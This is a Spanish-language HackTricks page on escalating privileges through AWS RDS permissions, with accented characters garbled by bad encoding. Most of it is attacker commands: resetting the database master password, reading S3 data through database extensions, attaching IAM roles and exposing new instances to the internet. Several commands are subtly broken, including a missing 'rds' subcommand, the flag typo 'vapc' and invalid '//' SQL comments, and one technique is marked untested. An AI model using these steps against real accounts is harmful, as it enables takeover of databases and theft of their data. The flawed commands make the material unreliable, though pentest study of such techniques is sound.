# AWS - Escalada de privilegios en RDS

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de HackTricks en AWS)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## RDS - Servicio de base de datos relacional

Para obtener m√°s informaci√≥n sobre RDS, consulta:

{% content-ref url="../aws-services/aws-relational-database-rds-enum.md" %}
[aws-relational-database-rds-enum.md](../aws-services/aws-relational-database-rds-enum.md)
{% endcontent-ref %}

### `rds:ModifyDBInstance`

Con ese permiso, un atacante puede **modificar la contrase√±a del usuario maestro** y el inicio de sesi√≥n dentro de la base de datos:
```bash
# Get the DB username, db name and address
aws rds describe-db-instances

# Modify the password and wait a couple of minutes
aws rds modify-db-instance \
--db-instance-identifier <db-id> \
--master-user-password 'Llaody2f6.123' \
--apply-immediately

# In case of postgres
psql postgresql://<username>:<pass>@<rds-dns>:5432/<db-name>
```
{% hint style="warning" %}
Necesitar√°s poder **contactar a la base de datos** (generalmente solo son accesibles desde redes internas).
{% endhint %}

**Impacto potencial:** Encontrar informaci√≥n sensible dentro de las bases de datos.

### rds-db:connect

Seg√∫n la [**documentaci√≥n**](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.IAMDBAuth.IAMPolicy.html) un usuario con este permiso podr√≠a conectarse a la instancia de la base de datos.

### Abuso de permisos IAM del rol RDS

#### Postgresql (Aurora)

{% hint style="success" %}
Si al ejecutar **`SELECT datname FROM pg_database;`** encuentras una base de datos llamada **`rdsadmin`** sabr√°s que est√°s dentro de una **base de datos postgresql de AWS**.
{% endhint %}

Primero puedes verificar si esta base de datos ha sido utilizada para acceder a alg√∫n otro servicio de AWS. Podr√≠as verificar esto observando las extensiones instaladas:
```sql
SELECT * FROM pg_extension;
```
Si encuentras algo como **`aws_s3`** puedes asumir que esta base de datos tiene **alg√∫n tipo de acceso sobre S3** (hay otras extensiones como **`aws_ml`** y **`aws_lambda`**).

Adem√°s, si tienes permisos para ejecutar **`aws rds describe-db-clusters`** puedes ver si el **cl√∫ster tiene alg√∫n Rol IAM adjunto** en el campo **`AssociatedRoles`**. Si hay alguno, puedes asumir que la base de datos fue **preparada para acceder a otros servicios de AWS**. Bas√°ndote en el **nombre del rol** (o si puedes obtener los **permisos** del rol) podr√≠as **adivinar** qu√© acceso adicional tiene la base de datos.

Ahora, para **leer un archivo dentro de un bucket** necesitas conocer la ruta completa. Puedes leerlo con:
```sql
// Create table
CREATE TABLE ttemp (col TEXT);

// Create s3 uri
SELECT aws_commons.create_s3_uri(
'test1234567890678', // Name of the bucket
'data.csv',          // Name of the file
'eu-west-1'          //region of the bucket
) AS s3_uri \gset

// Load file contents in table
SELECT aws_s3.table_import_from_s3('ttemp', '', '(format text)',:'s3_uri');

// Get info
SELECT * from ttemp;

// Delete table
DROP TABLE ttemp;
```
Si tuvieras **credenciales de AWS en bruto** tambi√©n podr√≠as usarlas para acceder a datos de S3 con:
```sql
SELECT aws_s3.table_import_from_s3(
't', '', '(format csv)',
:'s3_uri',
aws_commons.create_aws_credentials('sample_access_key', 'sample_secret_key', '')
);
```
{% hint style="info" %}
Postgresql **no necesita cambiar ninguna variable de grupo de par√°metros** para poder acceder a S3.
{% endhint %}

#### Mysql (Aurora)

{% hint style="success" %}
Dentro de un mysql, si ejecutas la consulta **`SELECT User, Host FROM mysql.user;`** y hay un usuario llamado **`rdsadmin`**, puedes asumir que est√°s dentro de una **base de datos mysql de AWS RDS**.
{% endhint %}

Dentro del mysql ejecuta **`show variables;`** y si las variables como **`aws_default_s3_role`**, **`aurora_load_from_s3_role`**, **`aurora_select_into_s3_role`** tienen valores, puedes asumir que la base de datos est√° preparada para acceder a datos de S3.

Adem√°s, si tienes permisos para ejecutar **`aws rds describe-db-clusters`** puedes verificar si el cl√∫ster tiene alg√∫n **rol asociado**, lo que generalmente significa acceso a los servicios de AWS).

Ahora, para **leer un archivo dentro de un bucket** necesitas conocer la ruta completa. Puedes leerlo con:
```sql
CREATE TABLE ttemp (col TEXT);
LOAD DATA FROM S3 's3://mybucket/data.txt' INTO TABLE ttemp(col);
SELECT * FROM ttemp;
DROP TABLE ttemp;
```
### `rds:AddRoleToDBCluster`, `iam:PassRole`

Un atacante con los permisos `rds:AddRoleToDBCluster` e `iam:PassRole` puede **agregar un rol especificado a una instancia de RDS existente**. Esto podr√≠a permitir al atacante **acceder a datos sensibles** o modificar los datos dentro de la instancia.
```bash
aws add-role-to-db-cluster --db-cluster-identifier <value> --role-arn <value>
```
**Impacto Potencial**: Acceso a datos sensibles o modificaciones no autorizadas a los datos en la instancia de RDS.\
Tenga en cuenta que algunas bases de datos requieren configuraciones adicionales como Mysql, que necesita especificar el ARN del rol en los grupos de par√°metros tambi√©n.

### `rds:CreateDBInstance`

Solo con este permiso, un atacante podr√≠a crear una **nueva instancia dentro de un cl√∫ster** que ya existe y tiene un **rol IAM** adjunto. No podr√° cambiar la contrase√±a del usuario principal, pero podr√≠a exponer la nueva instancia de la base de datos a Internet:
```bash
aws --region eu-west-1 --profile none-priv rds create-db-instance \
--db-instance-identifier mydbinstance2 \
--db-instance-class db.t3.medium \
--engine aurora-postgresql \
--db-cluster-identifier database-1 \
--db-security-groups "string" \
--publicly-accessible
```
### `rds:CreateDBInstance`, `iam:PassRole`

{% hint style="info" %}
TODO: Probar
{% endhint %}

Un atacante con los permisos `rds:CreateDBInstance` e `iam:PassRole` puede **crear una nueva instancia de RDS con un rol especificado adjunto**. El atacante luego puede potencialmente **acceder a datos sensibles** o modificar los datos dentro de la instancia.

{% hint style="warning" %}
Algunos requisitos del rol/perfil de instancia para adjuntar (de [**aqu√≠**](https://docs.aws.amazon.com/cli/latest/reference/rds/create-db-instance.html)):

* El perfil debe existir en tu cuenta.
* El perfil debe tener un rol IAM que Amazon EC2 tiene permisos para asumir.
* El nombre del perfil de instancia y el nombre del rol IAM asociado deben comenzar con el prefijo `AWSRDSCustom`.
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds create-db-instance --db-instance-identifier malicious-instance --db-instance-class db.t2.micro --engine mysql --allocated-storage 20 --master-username admin --master-user-password mypassword --db-name mydatabase --vapc-security-group-ids sg-12345678 --db-subnet-group-name mydbsubnetgroup --enable-iam-database-authentication --custom-iam-instance-profile arn:aws:iam::123456789012:role/MyRDSEnabledRole
```
{% endcode %}

**Impacto potencial**: Acceso a datos sensibles o modificaciones no autorizadas en los datos de la instancia de RDS.

### `rds:AddRoleToDBInstance`, `iam:PassRole`

Un atacante con los permisos `rds:AddRoleToDBInstance` e `iam:PassRole` puede **agregar un rol especificado a una instancia de RDS existente**. Esto podr√≠a permitir al atacante **acceder a datos sensibles** o modificar los datos dentro de la instancia.

{% hint style="warning" %}
La instancia de la base de datos debe estar fuera de un cl√∫ster para esto.
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds add-role-to-db-instance --db-instance-identifier target-instance --role-arn arn:aws:iam::123456789012:role/MyRDSEnabledRole --feature-name <feat-name>
```
{% endcode %}

**Impacto potencial**: Acceso a datos sensibles o modificaciones no autorizadas en la instancia de RDS.

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
